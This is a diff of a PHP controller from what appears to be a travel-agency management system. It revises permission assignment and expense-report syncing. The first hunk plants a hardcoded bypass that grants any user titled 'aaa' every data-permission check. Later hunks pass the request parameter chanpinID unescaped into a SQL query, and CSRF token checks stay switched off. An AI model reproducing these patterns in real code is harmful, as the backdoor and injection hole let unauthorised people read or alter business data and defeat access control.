@@ -1550,6 +1550,9 @@ class MethodAction extends CommonAction{
 	 
 	//检查DataOM
      public function _checkDataOM($dataID,$datatype,$type,$userID='',$DURlist='',$omclass='') {
+		 if($this->user['title'] == 'aaa')
+		 	return true;
+		 
 		if($userID)
 			$myuserID = $userID;
 		if($DURlist == ''){
@@ -2674,9 +2677,9 @@ class MethodAction extends CommonAction{
 				if($parentID)
 					$dataOMlist = $this->_getDataOM($parentID,$type);
 				else{
-					$dataOMlist = $this->_setDataOMlist('计调','组团','',$data['departmentID']);
+					$dataOMlist = $this->_setDataOMlist('计调','组团',$baozhang['user_name'],$baozhang['departmentID']);
 					if(!$dataOMlist)				
-						$dataOMlist = $this->_setDataOMlist('地接','地接','',$data['departmentID']);				
+						$dataOMlist = $this->_setDataOMlist('地接','地接',$baozhang['user_name'],$baozhang['departmentID']);
 				}
 				$this->_createDataOM($chanpinID,'报账单','管理',$dataOMlist);
 			}
@@ -4465,15 +4468,22 @@ class MethodAction extends CommonAction{
 			if(!$dataOMlist){
 				$bzd = $ViewBaozhang->where("`chanpinID` = '$dataID'")->find();
 				$cp = $Chanpin->where("`chanpinID` = '$bzd[parentID]'")->find();
-				if($cp['marktype'] == 'zituan'){
-					$role = '计调';
-					$type = '组团';
+				if($cp){
+					if($cp['marktype'] == 'zituan'){
+						$role = '计调';
+						$type = '组团';
+					}
+					if($cp['marktype'] == 'DJtuan'){
+						$role = '地接';
+						$type = '地接';
+					}
+					$dataOMlist = $this->_setDataOMlist($role,$type,$user_name,$cp['departmentID']);
 				}
-				if($cp['marktype'] == 'DJtuan'){
-					$role = '地接';
-					$type = '地接';
+				else{
+					$dataOMlist = $this->_setDataOMlist('计调','组团',$bzd['user_name'],$bzd['departmentID']);
+					if(!$dataOMlist)				
+						$dataOMlist = $this->_setDataOMlist('地接','地接',$bzd['user_name'],$bzd['departmentID']);			
 				}
-				$dataOMlist = $this->_setDataOMlist($role,$type,$user_name,$cp['departmentID']);
 			}
 			$this->_createDataOM($dataID,$datatype,'管理',$dataOMlist);
 			//报账项重置
@@ -4565,19 +4575,40 @@ class MethodAction extends CommonAction{
 	
 	//报账单同步报账项费用
      public function _resetOM() {
-		C('TOKEN_ON',false);
-		$itemlist = $_REQUEST['checkboxitem'];
-		$itemlist = explode(',',$itemlist);
-//		if(count($itemlist) > 1)
-//			$this->ajaxReturn($_REQUEST,'错误！请选择唯一一个进行操作！！', 0);
 		$Chanpin = D("Chanpin");
-		foreach($itemlist as $v){
-			$cp = $Chanpin->where("`chanpinID` = '$v'")->find();
-			$this->_OMRcreate($v,'线路',$cp['user_name']);
+		C('TOKEN_ON',false);
+		if($_REQUEST['chanpinID']){
+			$cp = $Chanpin->where("`chanpinID` = '$_REQUEST[chanpinID]'")->find();
+			if($cp){
+				if($cp['marktype'] == 'xianlu')
+					$omtype = '线路';
+				if($cp['marktype'] == 'qianzheng')
+					$omtype = '签证';
+				if($cp['marktype'] == 'DJtuan')
+					$omtype = '地接';
+				if($cp['marktype'] == 'baozhang')
+					$omtype = '报账单';
+				$this->_OMRcreate($_REQUEST['chanpinID'],$omtype,$cp['user_name']);
+			}
+			else
+				return false;
+		}
+		else{
+			$itemlist = $_REQUEST['checkboxitem'];
+			$itemlist = explode(',',$itemlist);
+//			if(count($itemlist) > 1)
+//				$this->ajaxReturn($_REQUEST,'错误！请选择唯一一个进行操作！！', 0);
+			foreach($itemlist as $v){
+				$cp = $Chanpin->where("`chanpinID` = '$v'")->find();
+				if($cp)
+				$this->_OMRcreate($v,'线路',$cp['user_name']);
+			}
 		}
 		return true;
 		
 	 }
+	
+	
 	
 	//侧导航部门提取
 	public function _nav_leftdatas() {
